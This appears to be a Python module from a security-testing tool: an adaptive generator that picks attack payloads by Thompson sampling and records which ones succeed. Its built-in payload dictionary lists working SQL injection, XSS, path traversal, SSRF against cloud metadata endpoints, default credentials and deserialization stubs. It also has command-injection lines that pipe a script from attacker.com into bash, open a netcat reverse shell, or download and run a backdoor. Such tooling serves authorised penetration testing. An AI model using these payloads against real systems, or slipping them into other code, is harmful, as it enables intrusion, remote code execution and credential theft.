from __future__ import annotations

import logging
import random
from dataclasses import dataclass
from typing import Any

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class PayloadSet:
    category: str
    payloads: list[str]
    source: str
    effectiveness_score: float = 0.5

    def to_dict(self) -> dict[str, Any]:
        return {
            "category": self.category,
            "payload_count": len(self.payloads),
            "source": self.source,
            "effectiveness_score": self.effectiveness_score,
        }


class AdaptivePayloadGenerator:
    """Generates adaptive payloads based on learned threat patterns.

    Uses Thompson Sampling-inspired selection to prioritize
    payloads that have historically been more effective.
    """

    BASE_PAYLOADS: dict[str, list[str]] = {
        "sql_injection": [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "1' AND SLEEP(5)--",
            "' OR 1=1#",
            "1' WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR EXISTS(SELECT * FROM users)--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<math><mtext><table><mglyph><svg>"
            "<mtext><textarea><path id='</textarea>"
            "<img onerror=alert(1) src=1>'>",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
            "..%00/..%00/..%00/etc/passwd",
            "{{ '/etc/passwd' }}",
            "${'/etc/passwd'}",
            "file:///etc/passwd",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "; curl http://attacker.com/shell.sh | bash",
            "| nc -e /bin/sh attacker.com 4444",
            "'; ls #",
            "$(cat /etc/shadow)",
            "| powershell -c 'Get-Process'",
            "; wget http://attacker.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://localhost:6379/",
            "http://127.0.0.1:8080/admin",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/user-data",
            "gopher://localhost:6379/_info",
            "dict://localhost:6379/info",
            "http://0177.0.0.1",
            "http://0x7f000001",
        ],
        "authentication_bypass": [
            "admin:admin",
            "admin:password",
            "root:root",
            "test:test",
            "admin:123456",
            "admin:admin123",
            "root:toor",
            "guest:guest",
            "administrator:administrator",
            "user:user",
        ],
        "deserialization": [
            '{"__class__": "os", "__init__": {"__reduce__": ["system", ["id"]]}}',
            "rO0ABXNyAB9qYXZhLnV0aWwuSGFzaE1hcEFueWltcGxT...",
            "AAAwgAAAA==",
            "gAN9cQBdoAHUfWhjb25maXN0aW9uABNUZXN0Q29uZmlnZQ==",
            "pickle protocol 5",
        ],
    }

    def __init__(self) -> None:
        self._effectiveness: dict[str, dict[str, float]] = {}
        self._historical_payloads: dict[str, list[str]] = {}

    def generate_payloads(
        self,
        category: str,
        count: int = 10,
        include_adaptive: bool = True,
    ) -> PayloadSet:
        base = self.BASE_PAYLOADS.get(category, [])
        adaptive = self._historical_payloads.get(category, [])

        all_candidates = list(base)
        if include_adaptive:
            all_candidates.extend(adaptive)

        if not all_candidates:
            return PayloadSet(
                category=category,
                payloads=[],
                source="none",
                effectiveness_score=0.0,
            )

        scored = []
        for payload in all_candidates:
            score = self._effectiveness.get(category, {}).get(payload, 0.5)
            scored.append((payload, score))

        selected = self._thompson_sample(scored, count)

        return PayloadSet(
            category=category,
            payloads=selected,
            source="adaptive" if include_adaptive else "base",
            effectiveness_score=sum(
                self._effectiveness.get(category, {}).get(p, 0.5)
                for p in selected
            ) / max(len(selected), 1),
        )

    def update_effectiveness(
        self,
        category: str,
        payload: str,
        success: bool,
    ) -> None:
        if category not in self._effectiveness:
            self._effectiveness[category] = {}

        current = self._effectiveness[category].get(payload, 0.5)
        if success:
            updated = min(1.0, current + 0.1)
        else:
            updated = max(0.0, current - 0.05)

        self._effectiveness[category][payload] = updated

    def add_adaptive_payload(self, category: str, payload: str) -> None:
        if category not in self._historical_payloads:
            self._historical_payloads[category] = []
        if payload not in self._historical_payloads[category]:
            self._historical_payloads[category].append(payload)

    def get_effectiveness_report(self) -> dict[str, Any]:
        report: dict[str, Any] = {}
        for category, payloads in self._effectiveness.items():
            scores = list(payloads.values())
            report[category] = {
                "total_payloads": len(payloads),
                "avg_effectiveness": sum(scores) / max(len(scores), 1),
                "high_effectiveness": sum(1 for s in scores if s >= 0.7),
                "low_effectiveness": sum(1 for s in scores if s < 0.3),
            }
        return report

    def _thompson_sample(
        self,
        candidates: list[tuple[str, float]],
        count: int,
    ) -> list[str]:
        if len(candidates) <= count:
            return [c[0] for c in candidates]

        sampled = []
        for payload, score in candidates:
            alpha = max(score * 10, 0.1)
            beta = max((1 - score) * 10, 0.1)
            sample = random.betavariate(alpha, beta)
            sampled.append((payload, sample))

        sampled.sort(key=lambda x: x[1], reverse=True)
        return [p[0] for p in sampled[:count]]

    def to_dict(self) -> dict[str, Any]:
        return {
            "effectiveness": self._effectiveness,
            "adaptive_payloads": {
                k: len(v) for k, v in self._historical_payloads.items()
            },
        }

    def from_dict(self, data: dict[str, Any]) -> None:
        self._effectiveness = data.get("effectiveness", {})
        for category, payloads in data.get("adaptive_payloads", {}).items():
            if isinstance(payloads, list):
                self._historical_payloads[category] = payloads
